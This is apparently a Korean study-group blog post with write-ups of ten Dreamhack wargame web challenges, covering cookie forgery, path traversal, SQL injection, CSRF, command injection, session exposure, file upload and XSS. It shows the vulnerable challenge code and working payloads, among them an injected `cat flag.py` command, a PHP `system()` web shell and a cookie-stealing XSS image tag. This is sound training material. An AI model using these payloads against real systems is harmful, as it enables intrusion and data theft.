---
layout: default
title: Day65
nav_order: 1

parent: Hacking Project - W10
grand_parent: P4C
---

##### 해당 게시글은 빡공팟 4기(with TeamH4C)와 관련되어 있습니다

-----

webhacking.kr 서버가 다운되어 드림핵 워게임을 풀다가 복구되는대로 풀겠읍니다!

# > dreamhack.io: cookie

## writeup

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

users = {
    'guest': 'guest',
    'admin': FLAG
}

@app.route('/')
def index():
    username = request.cookies.get('username', None)
    if username:
        return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not admin"}')
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            pw = users[username]
        except:
            return '<script>alert("not found user");history.go(-1);</script>'
        if pw == password:
            resp = make_response(redirect(url_for('index')) )
            resp.set_cookie('username', username)
            return resp 
        return '<script>alert("wrong password");history.go(-1);</script>'

app.run(host='0.0.0.0', port=8000)
```



### index

`username`의 쿠키값을 확인하고 해당 값에 따라 "admin"일 경우에 "admin" 패스워드에 해당하는 FLAG 값을, 그렇지 않을 경우에는 "you are not admin"이 출력된다.

<br>

### login

POST 방식으로 입력을 받을 경우에 아이디와 비밀번호가 일치하는지 확인하고, 정보가 존재한다면 로그인한 계정 아이디를 쿠키값으로 세팅한다. 이 때 비밀번호 기준이 아니기 때문에 `username` 쿠키에 넣는 값에 따라 현재 로그인된 정보가 변경될 수 있다.

![image-20220621110621491](../img/image-20220621110621491.png)

이와 같이 확인할 수 있고 해당 정보를 "admin"으로 수정할 경우 FLAG값을 몰라도 "admin"으로 로그인한 것과 같아진다.

![image-20220621110714627](../img/image-20220621110714627.png)

로그인 계정의 상태를 계정 아이디로 쿠키값을 세팅했기 때문에 풀 수 있었다.

<br><br><br>

-----

# > dreamhack.io: file-download-1

## writeup

```python
#!/usr/bin/env python3
import os
import shutil

from flask import Flask, request, render_template, redirect

from flag import FLAG

APP = Flask(__name__)

UPLOAD_DIR = 'uploads'


@APP.route('/')
def index():
    files = os.listdir(UPLOAD_DIR)
    return render_template('index.html', files=files)


@APP.route('/upload', methods=['GET', 'POST'])
def upload_memo():
    if request.method == 'POST':
        filename = request.form.get('filename')
        content = request.form.get('content').encode('utf-8')

        if filename.find('..') != -1:
            return render_template('upload_result.html', data='bad characters,,')

        with open(f'{UPLOAD_DIR}/{filename}', 'wb') as f:
            f.write(content)

        return redirect('/')

    return render_template('upload.html')


@APP.route('/read')
def read_memo():
    error = False
    data = b''

    filename = request.args.get('name', '')

    try:
        with open(f'{UPLOAD_DIR}/{filename}', 'rb') as f:
            data = f.read()
    except (IsADirectoryError, FileNotFoundError):
        error = True


    return render_template('read.html',
                           filename=filename,
                           content=data.decode('utf-8'),
                           error=error)


if __name__ == '__main__':
    if os.path.exists(UPLOAD_DIR):
        shutil.rmtree(UPLOAD_DIR)

    os.mkdir(UPLOAD_DIR)

    APP.run(host='0.0.0.0', port=8000)
```

### upload

POST 메소드를 통해 파일 이름과 내용을 입력받는다. 이 때 파일의 이름에 `..` 기호가 포함되어 있으면 "bad characters..."를 출력하고 업로드가 되지 않는다. 만약 정상적일 경우 서버의 `uploads`라는 폴더에 파일 정보를 기록하게 된다.

<br>

### read

GET 메소드를 통해 선택된 파일의 내용을 읽어다가 사용자에게 출력하는 형식이다. 이 때 어떠한 제한없이 사용자의 입력을 받은 뒤 출력하기 때문에 플래그의 파일 이름을 알 수 있다면 충분히 읽어올 수 있겠다.

![image-20220621112513551](../img/image-20220621112513551.png)

"flag" 파일명으로 게싱하였으나 불가능했고, `uploads`라는 폴더 이름을 알기에 디렉토리 리스팅을 시도하려 했으나 코드 일부에 `shutil.rmtree(UPLOAD_DIR)`가 존재해서인지 불가능했다.

![image-20220621135211866](../img/image-20220621135211866.png)

그래도 상위 디렉토리가 이동되는 것은 확인되었고, 코드를 되짚어보다가 현재 "uploads" 폴더는 이 웹페이지가 만들어질 당시에 `os.mkdir()`로 만들어지므로 flag파일은 이보다 상위 폴더에 위치할 것으로 예상된다. 그런데 파일명이 무엇인지를 모르겠다.

<br>

주어진 다운로드 파일을 확인해보다가 혹시나 "flag.txt"나 "flag.py"가 아닐까 했는데 아니나 다를까 문제 자체에서 설명이 나와있었다 ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ

![image-20220621135825351](../img/image-20220621135825351.png)

역시 문제는 꼼꼼히 읽어야한다.

![image-20220621135640582](../img/image-20220621135640582.png)


<br><br><br>

-----

# > dreamhack.io: simple_sqli

## writeup

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, g
import sqlite3
import os
import binascii

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

DATABASE = "database.db"
if os.path.exists(DATABASE) == False:
    db = sqlite3.connect(DATABASE)
    db.execute('create table users(userid char(100), userpassword char(100));')
    db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
    db.commit()
    db.close()

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

def query_db(query, one=True):
    cur = get_db().execute(query)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get('userid')
        userpassword = request.form.get('userpassword')
        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
        if res:
            userid = res[0]
            if userid == 'admin':
                return f'hello {userid} flag is {FLAG}'
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'

app.run(host='0.0.0.0', port=8000)
```

### login

그래도 워게임은 문제 이름으로 공격 벡터가 어디인지 유추가 가능해서 할만하다 ㅠㅠ. 쿼리의 결과에서 `userid` 정보가 "admin"이면 풀리는 문제이다. 

로그인 창을 만나면 건네는 `" or 1=1 --"`을 넣었는데 "hello guest" 팝업창이 반겨주었다. 아마도 guest 계정의 idx가 admin보다 높은 듯하다. 그래서 `admin" --`을 넣었더니

![image-20220621140342703](../img/image-20220621140342703.png)

간만에 힐링했다.



<br><br><br>

-----

# > dreamhack.io: pathtraversal 

## writeup



```python
#!/usr/bin/python3
from flask import Flask, request, render_template, abort
from functools import wraps
import requests
import os, json

users = {
    '0': {
        'userid': 'guest',
        'level': 1,
        'password': 'guest'
    },
    '1': {
        'userid': 'admin',
        'level': 9999,
        'password': 'admin'
    }
}

def internal_api(func):
    @wraps(func)
    def decorated_view(*args, **kwargs):
        if request.remote_addr == '127.0.0.1':
            return func(*args, **kwargs)
        else:
            abort(401)
    return decorated_view

app = Flask(__name__)
app.secret_key = os.urandom(32)
API_HOST = 'http://127.0.0.1:8000'

try:
    FLAG = open('./flag.txt', 'r').read() # Flag is here!!
except:
    FLAG = '[**FLAG**]'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/get_info', methods=['GET', 'POST'])
def get_info():
    if request.method == 'GET':
        return render_template('get_info.html')
    elif request.method == 'POST':
        userid = request.form.get('userid', '')
        info = requests.get(f'{API_HOST}/api/user/{userid}').text
        return render_template('get_info.html', info=info)

@app.route('/api')
@internal_api
def api():
    return '/user/<uid>, /flag'

@app.route('/api/user/<uid>')
@internal_api
def get_flag(uid):
    try:
        info = users[uid]
    except:
        info = {}
    return json.dumps(info)

@app.route('/api/flag')
@internal_api
def flag():
    return FLAG

application = app # app.run(host='0.0.0.0', port=8000)
# Dockerfile
#     ENTRYPOINT ["uwsgi", "--socket", "0.0.0.0:8000", "--protocol=http", "--threads", "4", "--wsgi-file", "app.py"]
```

### get_info

"guest" 또는 "admin"을 입력하면 계정에 대한 기초적인 정보가 출력이 된다. 이 때 이 정보를 얻어오기 위해서 `/api/user/`로 `uid` 정보를 전달하게 된다.

<br>

### get_flag

`/api/user/<uid>`로 경로를 받게되는데 uid 값에 대한 검증이 없다. 만약 `../`를 이용해 `/api/user/../flag`로 전송을 하게 되면 `flag()`가 실행되지 않을까 싶다.

그런데 `../flag`를 전송해도 따로 값이 나오질 않는다. 상식적으로 이해가 되질 않아서 날라가는 패킷을 잡아다가 심문해보기로 했다.

![image-20220621152157715](../img/image-20220621152157715.png)

분명 `../flag`를 넣고 전송을 눌렀는데 "undefined"로 글자가 변경되고, 잡힌 패킷에도 변경된 정보가 전달된다. 어쩐지 중간 중간 값을 넣어볼때마다 저 글자가 보이더라니 아직 원인 모를 무언가가 바꾸는 듯하다.

![image-20220621152423592](../img/image-20220621152423592.png)

처음 생각했던 시나리오대로 `../flag`를 전달했고 다행이도 `flag()`가 실행되었다.

![image-20220621152435427](/img/image-20220621152435427.png)



<br><br><br>

-----

# > dreamhack.io: csrf-1

## writeup

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        print(str(e))
        # return str(e)
        return False
    driver.quit()
    return True


def check_csrf(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/vuln")
def vuln():
    param = request.args.get("param", "").lower()
    xss_filter = ["frame", "script", "on"]
    for _ in xss_filter:
        param = param.replace(_, "*")
    return param


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param", "")
        if not check_csrf(param):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", None)
    if text:
        memo_text += text
    return render_template("memo.html", memo=memo_text)


@app.route("/admin/notice_flag")
def admin_notice_flag():
    global memo_text
    if request.remote_addr != "127.0.0.1":
        return "Access Denied"
    if request.args.get("userid", "") != "admin":
        return "Access Denied 2"
    memo_text += f"[Notice] flag is {FLAG}\n"
    return "Ok"


app.run(host="0.0.0.0", port=8000)
```

CSRF라는 이름으로 힌트가 있는 상태이기에 "admin"의 권한으로 `/admin/notice_flag`에 접근해야할 듯하다. 일반적으로는 공격자가 심어놓은 스크립트를 피해자가 열람해서 발생하는데... 이건 어떤 원리인지 분석해볼 필요가 있겠다.

### admin_notice_flag()

이 문제를 풀기 위해서는 접속 IP 정보가 `127.0.0.1`이어야 하고, userid 정보가 "admin"이여야만 `memo_text`라는 글로벌 변수에 플래그가 적히게 된다.


### memo()

사용자의 입력 또는 `admin_notice_flag`에서 적힌 값들이 여기 적히게 된다.


### vuln()

xss_filter 리스트를 만들어두고 입력받는 값들을 전부 소문자로 만든 뒤 필터링을 거친다. `script`나 `onerror` 외에 다른 방법을 찾아야할 것 같다.


### flag()

POST 메소드로 입력받은 값을 `check_csrf`라는 함수로 넒긴 뒤 이 결과에 따라 "wrong??" 또는 "good"을 출력한다.


### check_csrf()

여기서는 `http://127.0.0.1:8000/vuln?param=` 에다가 `flag()`로부터 넘겨받은 인자를 더한 후에 `read_url` 함수로 토스.


### read_url()

쿠키에서 "domain"이라는 키에 "127.0.0.1" 값을 넣어서 정보로 추가하고, 몇 개의 옵션을 가지고 크롬으로 브라우저 접속과 같은 역할을 수행한다. 아마도 이 함수가 트리거되면서 피해자가 해당 스크립트를 실행한 듯한 환경을 만들어주는 것 같다.

그럼 상황을 정리해보자면 `flag()`란에 적절한 스크립트를 넣으면 `check_csrf()`로 넘어가게 되고, url이 완성되어 `read_url()`로 넘어간다. 여기서는 "127.0.0.1" 정보를 들고 있는 상태로 내가 작성한 코드를 `vuln()`에 방문하기 때문에, `/admin/notice_flag`로 이동하면 문제가 풀린다. 즉, 이제 어떤 스크립트를 넣을지 생각해보면 되겠다.

```html
<script>location.href(target)</script> 
<img src='X' onerror='location.href(target)'>
<img src="target">
```

알고있는 방법 중에 가장 마지막 문장이 필터링에 안걸리니까 `<img src="/admin/notice_flag">` 를 전달해보았다.

![image-20220621161346728](../img/image-20220621161346728.png)

"good" 이 떴고 신나서 memo로 이동해보았는데 왠걸? 플래그가 없다... 머리가 멍해졌다.

<br>

밥을 먹고와서 코드를 차분히 다시 읽다가 `admin_notice_flag()` 부분에서 내가 해석을 다해놓고 건너뛴 부분이 있었다. 바로 `userid`의 값을 "admin"으로 설정안했던 것이다.

```
<img src="/admin/notice_flag?userid=admin">
```

![image-20220621161801610](../img/image-20220621161801610.png)

저번에 과제를 다 못해서 그런지 마음이 좀 급했던 것 같다.

<br><br><br>

-----

# > dreamhack.io: command-injection-1

## writeup

```python
#!/usr/bin/env python3
import subprocess

from flask import Flask, request, render_template, redirect

from flag import FLAG

APP = Flask(__name__)


@APP.route('/')
def index():
    return render_template('index.html')


@APP.route('/ping', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST':
        host = request.form.get('host')
        cmd = f'ping -c 3 "{host}"'
        try:
            output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
            return render_template('ping_result.html', data=output.decode('utf-8'))
        except subprocess.TimeoutExpired:
            return render_template('ping_result.html', data='Timeout !')
        except subprocess.CalledProcessError:
            return render_template('ping_result.html', data=f'an error occurred while executing the command. -> {cmd}')

    return render_template('ping.html')


if __name__ == '__main__':
    APP.run(host='0.0.0.0', port=8000)
```

command injection... 코드 중간에 `f'ping -c 3"{host}"`를 읽고 바로 공격했다.

```
8.8.8.8"; cat "flag.py
```

그런데 아래 요소가 방해를 하여 지운 뒤 전송했다.

```html
<input type="text" class="form-control" id="Host" placeholder="8.8.8.8" name="host" pattern="[A-Za-z0-9.]{5,20}" required="">
```

![image-20220621162705702](../img/image-20220621162705702.png)

또 달콤한 힐링 문제였다.


<br><br><br>

-----

# > dreamhack.io: session-basic

## writeup

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

users = {
    'guest': 'guest',
    'user': 'user1234',
    'admin': FLAG
}


# this is our session storage 
session_storage = {
}


@app.route('/')
def index():
    session_id = request.cookies.get('sessionid', None)
    try:
        # get username from session_storage 
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html')

    return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not admin"}')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            # you cannot know admin's pw 
            pw = users[username]
        except:
            return '<script>alert("not found user");history.go(-1);</script>'
        if pw == password:
            resp = make_response(redirect(url_for('index')) )
            session_id = os.urandom(32).hex()
            session_storage[session_id] = username
            resp.set_cookie('sessionid', session_id)
            return resp 
        return '<script>alert("wrong password");history.go(-1);</script>'


@app.route('/admin')
def admin():
    # what is it? Does this page tell you session? 
    # It is weird... TODO: the developer should add a routine for checking privilege 
    return session_storage


if __name__ == '__main__':
    import os
    # create admin sessionid and save it to our storage
    # and also you cannot reveal admin's sesseionid by brute forcing!!! haha
    session_storage[os.urandom(32).hex()] = 'admin'
    print(session_storage)
    app.run(host='0.0.0.0', port=8000)

```

### index()

현재 설정된 세션값을 기준으로 키에 대응한 값이 "admin" 일 경우에만 FLAG를 내어준다.

<br>

### login()

기본적으로 로그인을 검증하는 과정에다가 `session_id`라는 키에 접속 id값을 넣은 쿠키를 발급한다. 이 때 `session_id`값은 랜덤한 32자리의 값으로 유추가 불가능하다.

<br>

### admin()

마지막 return 줄을 읽고 `session_storage`를 반환하길래 바로 주소창에 적었다.

![image-20220621163151631](../img/image-20220621163151631.png)

그리곤 출력되었다. 음 이러면 푼거 아닌가?

![image-20220621163553797](../img/image-20220621163553797.png)

단순히 쿠키값에 `/admin`에서 얻은 세션값을 넣었을 뿐인데 풀렸다. 힐-링

<br><br><br>

-----

# > dreamhack.io: image-storage

## writeup

![image-20220621163636934](../img/image-20220621163636934.png)

혹시나 저번처럼 플래그파일 이름 모를까봐 2번 읽었다.

<br>

### list.php

```php
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li>
            <li><a href="/upload.php">Upload</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/><br/>
    <div class="container"><ul>
    <?php
        $directory = './uploads/';
        $scanned_directory = array_diff(scandir($directory), array('..', '.', 'index.html'));
        foreach ($scanned_directory as $key => $value) {
            echo "<li><a href='{$directory}{$value}'>".$value."</a></li><br/>";
        }
    ?> 
    </ul></div> 
</body>
</html>
```

`array_diff`를 통해 파일명에 경로를 나타내는 문자 `.` 또는 `..` 가 포함되지 않도록 하는 것 같다. 아마도 평범한 경로 탐색 문제는 아닌듯하다.

<br>

### upload.php

```php
<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES)) {
      $directory = './uploads/';
      $file = $_FILES["file"];
      $error = $file["error"];
      $name = $file["name"];
      $tmp_name = $file["tmp_name"];
     
      if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
      }else {
        if (file_exists($directory . $name)) {
          echo $name . " already exists. ";
        }else {
          if(move_uploaded_file($tmp_name, $directory . $name)){
            echo "Stored in: " . $directory . $name;
          }
        }
      }
    }else {
        echo "Error !";
    }
    die();
  }
?>
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li>
            <li><a href="/upload.php">Upload</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/><br/>
    <div class="container">
      <form enctype='multipart/form-data' method="POST">
        <div class="form-group">
          <label for="InputFile">파일 업로드</label>
          <input type="file" id="InputFile" name="file">
        </div>
        <input type="submit" class="btn btn-default" value="Upload">
      </form>
    </div> 
</body>
</html>
```

문제는 이미지 저장소인데 딱히 이미지 파일에 대한 검증이 없다. 무엇이든 올릴 수 있다는 것이니 뭘로 flag를 얻어볼까?

```php
<?php
	echo system("cat /flag.txt");
?>
```

![image-20220621165255723](../img/image-20220621165255723.png)

사실 `cat flag.txt`로 두 번 전송했다가 왜 안나오지 하고 세번째에 플래그를 얻었다 ㅋㅋㅋㅋㅋ

<br><br><br>

-----

# > dreamhack.io: Carve Party

## writeup

![image-20220621192238173](../img/image-20220621192238173.png)

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script>
<script>
var pumpkin = [ 124, 112, 59, 73, 167, 100, 105, 75, 59, 23, 16, 181, 165, 104, 43, 49, 118, 71, 112, 169, 43, 53 ];
var counter = 0;
var pie = 1;

function make() {
  if (0 < counter && counter <= 1000) {
    $('#jack-nose').css('opacity', (counter) + '%');
  }
  else if (1000 < counter && counter <= 3000) {
    $('#jack-left').css('opacity', (counter - 1000) / 2 + '%');
  }
  else if (3000 < counter && counter <= 5000) {
    $('#jack-right').css('opacity', (counter - 3000) / 2 + '%');
  }
  else if (5000 < counter && counter <= 10000) {
    $('#jack-mouth').css('opacity', (counter - 5000) / 5 + '%');
  }

  if (10000 < counter) {
    $('#jack-target').addClass('tada');
    var ctx = document.querySelector("canvas").getContext("2d"),
    dashLen = 220, dashOffset = dashLen, speed = 20,
    txt = pumpkin.map(x=>String.fromCharCode(x)).join(''), x = 30, i = 0;

    ctx.font = "50px Comic Sans MS, cursive, TSCu_Comic, sans-serif"; 
    ctx.lineWidth = 5; ctx.lineJoin = "round"; ctx.globalAlpha = 2/3;
    ctx.strokeStyle = ctx.fillStyle = "#1f2f90";

    (function loop() {
      ctx.clearRect(x, 0, 60, 150);
      ctx.setLineDash([dashLen - dashOffset, dashOffset - speed]); // create a long dash mask
      dashOffset -= speed;                                         // reduce dash length
      ctx.strokeText(txt[i], x, 90);                               // stroke letter

      if (dashOffset > 0) requestAnimationFrame(loop);             // animate
      else {
        ctx.fillText(txt[i], x, 90);                               // fill final letter
        dashOffset = dashLen;                                      // prep next char
        x += ctx.measureText(txt[i++]).width + ctx.lineWidth * Math.random();
        ctx.setTransform(1, 0, 0, 1, 0, 3 * Math.random());        // random y-delta
        ctx.rotate(Math.random() * 0.005);                         // random rotation
        if (i < txt.length) requestAnimationFrame(loop);
      }
    })();
  }
  else {
    $('#clicks').text(10000 - counter);
  }
}

$(function() {
  $('#jack-target').click(function () {
    counter += 1;
    if (counter <= 10000 && counter % 100 == 0) {
      for (var i = 0; i < pumpkin.length; i++) {
        pumpkin[i] ^= pie;
        pie = ((pie ^ 0xff) + (i * 10)) & 0xff;
      }
    }
    make();
  });
});
</script>
</body>
</html>
```

만번을 클릭하면 플래그를 획득하기는 하는데 단순히 어느 수치를 바꾼다고해서 쉽게 조작할 수 있을 거 같지는 않다. 매 클릭마다 카운터가 올라가며 어떠한 연산이 계속 수행되기 때문이다. 자동으로 클릭하게끔 만들거나 코드를 조금 수정하면 될 것 같긴하다.

```javascript
$('#jack-target').click(function () {
    counter += 1;
    if (counter <= 10000 && counter % 100 == 0) {
      for (var i = 0; i < pumpkin.length; i++) {
        pumpkin[i] ^= pie;
        pie = ((pie ^ 0xff) + (i * 10)) & 0xff;
      }
    }
```

이 부분에서 if 문에 들어가는 조건이 클릭 횟수의 100의 배수여야만 들어가는 것을 보고,결국 100의 배수가 되는 클릭에만 특정 로직이 돌아가는 것으로 이해했다. 그래서 `counter += 1;` 부분을 `counter += 100;` 으로 바꿔주고 100번만 클릭했다.

![image-20220621193122847](../img/image-20220621193122847.png)

1만번 클릭하는 것보다는 훨씬 나으니까 :)

<br><br><br>

-----

# > dreamhack.io: xss-2

## writeup

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/vuln")
def vuln():
    return render_template("vuln.html")


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


app.run(host="0.0.0.0", port=8000)
```

CSRF 문제와 형식이 유사한 듯한데, 이번엔 FLAG 값이 `value` 키의 값으로 전달되어진다. 물론 우리가 확인할 수 있는 것은 아니고, `read_url()` 함수 실행 시 인자로 전달되어지기 때문에 적당~한 스크립트로 쿠키 정보를 가져와야 할듯하다. 근데 재밌는 점은 vuln 페이지에서 스크립트 문이 안먹는다.

![image-20220621195447674](../img/image-20220621195447674.png)

분명 `param`으로 전달하여 html에는 적혔으나 실행이 안된다. 그래서 `img` 태그를 사용해보니 잘된다. 그리고 또 생각해야할 점은 어딘가에 쿠키값을 적어둬야 확인이 가능하다. 아마도 `memo()`를 이용해보면 되지 않을까?

```html
<img src="X" onerror="location.href('/memo?memo='+document.cookie);"> <!--함수 사용법 이슈-->
<img src="X" onerror="location.href='/memo?memo='+document.cookie">
```

`location.href`를 php의 `history.go()`처럼 생각해서 잠깐 헤맸는데 뭔가 이상하다 싶어서 구글링하여 찾아냈다. 생각보다 여태 풀어온 문제들 덕분인지 시도가 막혀도 막막한 느낌만 드는건 아니다. 다른 방도가 있겠지라는 생각으로 이어지는게 참 좋은 습관인 것 같다.

![image-20220621202738100](../img/image-20220621202738100.png)



근데 문제를 풀고나서야 웹사이트 이름은 XSS-1인데 문제 이름은 XSS-2 인것을 알았다.
